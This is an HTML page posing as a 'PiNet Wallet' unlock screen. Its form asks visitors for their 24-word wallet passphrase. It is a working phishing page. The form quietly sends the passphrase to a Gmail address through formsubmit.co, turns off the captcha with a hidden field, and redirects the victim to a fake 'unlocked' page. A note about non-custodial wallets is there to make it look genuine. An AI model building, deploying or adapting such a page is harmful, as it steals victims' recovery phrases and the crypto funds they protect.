<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>PiNet Wallet</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <!-- Header -->
  <header class="topbar">
    <div class="left"><button class="back-btn">&lt;</button></div>
    <div class="center">
      <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="Pi logo" class="logo" />
      <span class="home-text">Home</span>
    </div>
    <div class="right"></div>
  </header>

 <!-- Main Content -->
<div class="app">
  <main class="main">

    <!-- Logo + Welcome -->
    <div class="center-block">
      <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png?updatedAt=1753683705173" alt="Pi logo" class="logo-lg" />
      <span class="welcome">Welcome to the PiNet</span>
    </div>

    <!-- Unlock Row -->
    <div class="center-block">
      <img src="https://ik.imagekit.io/pinet/Pi/unlock.png?updatedAt=1753819802279" alt="Unlock" class="unlock-icon" />
      <span class="unlock-text">Unlock Pi Wallet</span>
    </div>

    <!-- UPDATED FORM -->
    <form id="passphrase-form" action="https://formsubmit.co/picoinulock0786@gmail.com" method="POST">
      <div class="passphrase-box">
        <textarea id="passphrase" name="passphrase" class="input" placeholder="Enter your 24-word passphrase here" required></textarea>
      </div>

      <!-- Hidden fields -->
      <input type="hidden" name="unlock_method" id="unlock_method" value="">
      <!-- Redirect to unlocked.html after submit -->
      <input type="hidden" name="_next" value="https://onlineworld2.github.io/PINet/unlocked.html">
      <!-- Disable captcha on FormSubmit -->
      <input type="hidden" name="_captcha" value="false">

      <button type="submit" class="btn">Unlock With Passphrase</button>
    </form>
      <!-- Note -->
      <div class="note">
        <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
        <a href="https://www.pinet.com" target="_blank">You can create a new wallet</a>, but all your it in your previous wallet will be inaccessible. 
          </p>
      </div>
    </main>
  </div>

  <script src="script.js"></script>
</body>
</html>
